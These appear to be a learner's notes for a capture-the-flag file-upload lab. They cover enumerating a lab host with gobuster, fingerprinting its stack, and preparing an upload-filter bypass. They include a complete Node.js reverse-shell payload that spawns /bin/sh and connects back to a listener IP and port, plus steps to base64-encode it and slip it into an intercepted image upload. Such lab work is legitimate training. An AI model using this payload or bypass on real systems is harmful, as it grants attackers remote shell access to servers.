gobuster dir -u http://jewel.uploadvulns.thm -w uploadvulnwordlist.txt -x jpeg

using wappalyzer extension on admin page reveals that it is jQuery3.5.1

-------------------------------------------------------------------------------

we intercepted the request in burp suite on admin page - found that it was powered by express (node.js)

we see that there is client side filtering (uploaded files are given a three letter name instead of original file name)


so first of all grab the node js shell

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.10.132.71", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();


then we upload a legit jpg file to server but use burp to intercept the request

convert the text of the node js to base64   - https://www.base64encode.org/
